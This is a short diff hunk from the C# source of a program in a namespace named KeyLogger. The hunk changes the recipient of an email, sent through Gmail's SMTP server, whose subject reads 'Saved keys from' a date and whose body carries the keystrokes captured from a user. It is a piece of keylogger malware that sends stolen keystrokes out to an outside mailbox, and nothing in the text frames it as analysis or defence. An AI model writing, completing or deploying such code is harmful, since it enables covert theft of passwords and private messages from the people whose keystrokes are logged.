@@ -112,7 +112,7 @@ namespace KeyLogger
                 MailMessage mail = new MailMessage();
                 SmtpClient SmtpServer = new SmtpClient("smtp.gmail.com");
                 mail.From = new MailAddress("uu746825@gmail.com");
-                mail.To.Add("adam.haldas@gmail.com");
+                mail.To.Add("uu746825@gmail.com");
                 mail.Subject = "Saved keys from " + date;
                 mail.Body = "Keystrokes saved from user " + user;
 
